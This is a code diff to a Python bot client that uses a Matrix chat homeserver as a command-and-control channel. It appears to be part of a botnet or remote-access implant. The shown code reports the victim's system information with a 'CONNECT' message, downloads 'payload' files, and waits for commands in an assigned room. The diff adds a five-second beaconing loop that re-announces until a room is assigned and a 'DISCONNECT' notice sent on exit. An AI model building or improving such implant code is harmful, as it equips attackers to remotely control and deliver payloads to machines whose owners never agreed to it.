@@ -1,6 +1,7 @@
 import json
 import platform
 import socket
+import time
 import uuid
 from matrix_client.client import MatrixClient, Room
 from matrix_client.api import MatrixRequestError
@@ -9,6 +10,9 @@ from requests.exceptions import MissingSchema
 import os
 import sys
 from dotenv import load_dotenv
+import atexit
+
+
 
 load_dotenv()
 USER_NAME = os.getenv('BOT_NAME')  
@@ -27,6 +31,7 @@ class Bot:
     command_listener: uuid.UUID
     
     def __init__(self):
+        self.got_room = False
         self.bot_id = str(uuid.uuid4())
         self.client = MatrixClient(MATRIX_HOMESERVER)
 
@@ -63,6 +68,11 @@ class Bot:
             f"CONNECT:{self.get_system_info()}"
         )
         
+    def disconnect(self):
+        self.announce_room.send_text(
+            f"DISCONNECT:{self.command_room.room_id}:{self.bot_id}"
+        )
+    
     def download_file(self, event, download_dir="downloads") -> str:
         content = event["content"]
         filename = content.get("body", "payload_file")
@@ -114,6 +124,7 @@ class Bot:
         
         botid, roomid = msgbody.removeprefix("RESOLVE ").split(":", 1)
         if botid == self.bot_id:
+            self.got_room = True
             self.command_room = self.join_room(roomid)
             self.client.remove_listener(self.announce_listener)
             self.command_listener = self.command_room.add_listener(self.on_command, event_type="m.room.message")
@@ -131,9 +142,15 @@ class Bot:
         
         self.announce()
         self.download_payload()
+        def exit_handler():
+            self.disconnect()
+
+        atexit.register(exit_handler)
         
         while True:
-            pass
+            if not self.got_room:
+                time.sleep(5) # TODO: In real world a minute or so
+                self.announce()
         
         
 
